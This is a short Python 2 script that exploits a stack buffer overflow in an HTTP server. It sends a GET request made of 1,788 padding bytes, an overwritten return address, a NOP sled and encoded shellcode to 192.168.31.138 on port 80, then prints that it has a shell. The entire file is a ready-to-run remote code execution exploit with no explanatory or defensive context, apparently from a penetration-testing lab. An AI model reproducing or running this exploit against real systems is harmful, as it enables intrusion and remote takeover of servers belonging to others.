#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# 43366843 = 1788
# /x00/x0a/x0d
shell=("\xda\xc3\xbb\xdf\x4d\x6e\x92\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x56\x31\x58\x18\x83\xc0\x04\x03\x58\xcb\xaf\x9b\x6e\x1b\xad"
"\x64\x8f\xdb\xd2\xed\x6a\xea\xd2\x8a\xff\x5c\xe3\xd9\x52\x50"
"\x88\x8c\x46\xe3\xfc\x18\x68\x44\x4a\x7f\x47\x55\xe7\x43\xc6"
"\xd5\xfa\x97\x28\xe4\x34\xea\x29\x21\x28\x07\x7b\xfa\x26\xba"
"\x6c\x8f\x73\x07\x06\xc3\x92\x0f\xfb\x93\x95\x3e\xaa\xa8\xcf"
"\xe0\x4c\x7d\x64\xa9\x56\x62\x41\x63\xec\x50\x3d\x72\x24\xa9"
"\xbe\xd9\x09\x06\x4d\x23\x4d\xa0\xae\x56\xa7\xd3\x53\x61\x7c"
"\xae\x8f\xe4\x67\x08\x5b\x5e\x4c\xa9\x88\x39\x07\xa5\x65\x4d"
"\x4f\xa9\x78\x82\xfb\xd5\xf1\x25\x2c\x5c\x41\x02\xe8\x05\x11"
"\x2b\xa9\xe3\xf4\x54\xa9\x4c\xa8\xf0\xa1\x60\xbd\x88\xeb\xec"
"\x72\xa1\x13\xec\x1c\xb2\x60\xde\x83\x68\xef\x52\x4b\xb7\xe8"
"\xe3\x5b\x48\x26\x4b\x0b\xb6\xc7\xab\x05\x7d\x93\xfb\x3d\x54"
"\x9c\x90\xbd\x59\x49\x0c\xb4\xcd\xb2\x78\xd7\x19\x5b\x7a\xe8"
"\x30\xc7\xf3\x0e\x62\xa7\x53\x9f\xc3\x17\x13\x4f\xac\x7d\x9c"
"\xb0\xcc\x7d\x77\xd9\x67\x92\x21\xb1\x1f\x0b\x68\x49\x81\xd4"
"\xa7\x37\x81\x5f\x4d\xc7\x4c\xa8\x24\xdb\xb9\xcf\xc6\x23\x3a"
"\x7a\xc6\x49\x3e\x2c\x91\xe5\x3c\x09\xd5\xa9\xbf\x7c\x66\xad"
"\x40\x01\x5e\xc5\x77\x97\xde\xb1\x77\x77\xde\x41\x2e\x1d\xde"
"\x29\x96\x45\x8d\x4c\xd9\x53\xa2\xdc\x4c\x5c\x92\xb1\xc7\x34"
"\x18\xef\x20\x9b\xe3\xda\x32\xdc\x1b\x98\x1c\x45\x73\x62\x1d"
"\x75\x83\x08\x9d\x25\xeb\xc7\xb2\xca\xdb\x28\x19\x83\x73\xa2"
"\xcc\x61\xe2\xb3\xc4\x24\xba\xb4\xeb\xfc\x4d\xce\x84\x03\xae"
"\x2f\x8d\x67\xaf\x2f\xb1\x99\x8c\xf9\x88\xef\xd3\x39\xaf\xe0"
"\x66\x1f\x86\x6a\x88\x33\xd8\xbe")
ESP= "\x53\x93\x42\x7E" # 7E429353
payload = "A"*1788 + ESP + "\x90"*30+ shell
method="GET"
protocol=" HTTP/1.1\r\n\r\n"
buffer=method+payload+ shell+ protocol
try:
    print "Sending Payload"
    s.connect(('192.168.31.138',80))
    s.send(buffer)
    print "We have a SHELL W00T"
except:
    print"Failed Fuzzing"